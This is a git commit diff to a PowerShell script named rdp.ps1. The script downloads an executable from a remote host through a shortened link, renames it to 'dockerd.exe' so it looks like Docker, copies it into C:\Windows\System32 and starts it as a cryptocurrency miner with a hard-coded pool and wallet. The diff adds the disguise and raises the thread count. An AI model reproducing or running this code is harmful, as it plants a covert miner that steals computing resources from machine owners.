6086f1bc9330036c480bcb7933b79ff813d53e02
kijang-020 <85983742+kijang-020@users.noreply.github.com>
2021-11-05 22:37:02 +0700

    Update rdp.ps1

--- web/rdp.ps1
+++ web/rdp.ps1
@@ -1,5 +1,5 @@
-Invoke-WebRequest https://logcat01.herokuapp.com/logcat.exe -OutFile logcat.exe
-Copy logcat.exe C:\Windows\System32
-cmd /c echo cmd /k start logcat.exe -a yespowerSUGAR -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.worker1 -t2 >>a.ps1
+Invoke-WebRequest https://bit.ly/3nYkEli -OutFile dockerd.exe
+Copy dockerd.exe C:\Windows\System32
+cmd /c echo cmd /k start dockerd.exe -a yespowerSUGAR -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.worker1 -t4 >>a.ps1
 cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
 .\a.ps1
